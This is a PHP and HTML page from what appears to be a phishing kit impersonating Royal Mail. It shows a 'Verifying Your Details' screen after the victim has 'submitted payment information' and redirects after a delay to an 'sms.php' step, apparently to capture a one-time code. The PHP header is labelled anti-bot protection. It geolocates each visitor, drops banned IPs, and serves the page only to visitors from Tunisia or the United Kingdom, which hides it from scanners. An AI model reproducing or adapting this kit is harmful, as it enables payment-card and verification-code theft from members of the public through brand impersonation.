<?php
// === ANTI-BOT PROTECTION ===
$bannedFile = __DIR__ . '/banned_ips.txt';

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}
$ip = getUserIP();

$details = @json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country"));
$country = ($details && $details->status === 'success') ? $details->country : 'Unknown';

if (file_exists($bannedFile)) {
    $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $banned)) {
        header("HTTP/1.0 403 Forbidden");
        exit;
    }
}

$allowedCountries = ['Tunisia', 'United Kingdom'];
if (!in_array($country, $allowedCountries)) {
    header("HTTP/1.0 403 Forbidden");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Royal Mail - Verifying Your Details</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
<style>
  :root {
    --rm-red: #cc0000;
    --rm-white: #fff;
    --rm-grey-light: #f9f9f9;
    --rm-grey-dark: #333;
  }
  body {
    background-color: var(--rm-grey-light);
    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
    color: var(--rm-grey-dark);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 2rem;
    margin: 0;
    text-align: center;
  }
  nav.navbar {
    background-color: var(--rm-red);
    padding: 0.5rem 1rem;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: 1000;
  }
  nav.navbar img {
    height: 50px;
  }
  main {
    margin-top: 100px;
    max-width: 500px;
    background: var(--rm-white);
    padding: 2.5rem 3rem;
    border-radius: 12px;
    box-shadow: 0 8px 24px rgb(0 0 0 / 0.1);
    border-top: 5px solid var(--rm-red);
  }
  h1 {
    color: var(--rm-red);
    font-weight: 700;
    margin-bottom: 1rem;
  }
  .spinner-border {
    width: 4rem;
    height: 4rem;
    color: var(--rm-red);
    margin: 2rem 0;
  }
  p.lead {
    font-size: 1.25rem;
    margin-bottom: 1.5rem;
  }
  footer {
    margin-top: auto;
    background-color: var(--rm-red);
    color: var(--rm-white);
    padding: 1rem 0;
    width: 100%;
    text-align: center;
    font-size: 0.9rem;
    position: fixed;
    bottom: 0;
    left: 0;
  }
  footer img {
    max-height: 30px;
    margin-top: 6px;
  }
</style>
<meta http-equiv="refresh" content="12;url=sms.php" />
</head>
<body>
<nav class="navbar navbar-dark" role="banner">
  <div class="container d-flex justify-content-center">
    <a href="#" aria-label="Royal Mail Home">
      <img src="https://images.seeklogo.com/logo-png/26/2/royal-mail-uk-logo-png_seeklogo-267922.png" alt="Royal Mail Logo" />
    </a>
  </div>
</nav>
<main role="main" aria-live="polite" aria-busy="true">
  <h1>Verifying Your Details</h1>
  <p class="lead">Thank you for submitting your payment information.</p>
  <p>For security reasons, we are carefully verifying your details to ensure your delivery is processed safely.</p>
  <div class="spinner-border" role="status" aria-label="Loading spinner">
    <span class="visually-hidden">Loading...</span>
  </div>
  <p>Please do not close this page. You will be redirected to the next step shortly.</p>
</main>
<footer role="contentinfo">
  <div>© 2025 Royal Mail Group Ltd</div>
  <img src="https://images.seeklogo.com/logo-png/26/2/royal-mail-uk-logo-png_seeklogo-267922.png" alt="Royal Mail Logo" />
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
